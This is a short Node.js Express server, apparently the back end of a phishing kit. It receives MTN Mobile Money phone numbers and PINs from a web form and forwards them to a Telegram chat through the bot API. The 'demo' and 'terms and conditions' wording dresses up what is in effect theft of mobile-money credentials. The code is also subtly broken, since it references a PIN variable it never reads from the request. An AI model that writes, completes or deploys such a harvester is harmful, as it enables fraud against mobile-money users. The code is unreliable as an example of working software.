const express = require("express");
const path = require("path");

const app = express();

const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(__dirname));


// Mtn submission endpoint
app.post("/mtn-submission", async (req, res) => {

  const { phone, success } = req.body;

  // Validate the mtn request
  if (
    typeof phone !== "string" ||
    typeof success !== "boolean"
  ) {
    return res.status(400).json({
      success: false,
      message: "Invalid mtn submission"
    });
  }

  /*
    IMPORTANT:
    Signing in confirms your acceptance of our terms and privacy policy.
  */

  console.log("DEMO SUBMISSION");
  console.log("Phone:", phone);
  console. log("pin:", pin) ;
  console.log("Result:", success ? "Successful" : "Failed");

  // Optional Telegram notification
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (botToken && chatId) {

    const message =
`🧪 MTN MoMo SUBMISSION

📱 Mtn number: ${phone}
📱 Mtn pin:${pin}
📱 Time :
✅ Result: ${success ? "Application successful" : "Application failed"}

🔐 Terms and conditions applies.
`;

    try {

      const telegramResponse = await fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message
          })
        }
      );

      if (!telegramResponse.ok) {
        console.error(
          "Telegram error:",
          await telegramResponse.text()
        );
      }

    } catch (error) {
      console.error("Telegram request failed:", error);
    }
  }

  return res.json({
    success: true,
    message: "Mtn submission received"
  });
});


// Serve index.html
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});


app.listen(PORT, () => {
  console.log(`Mtn server running on port ${PORT}`);
});
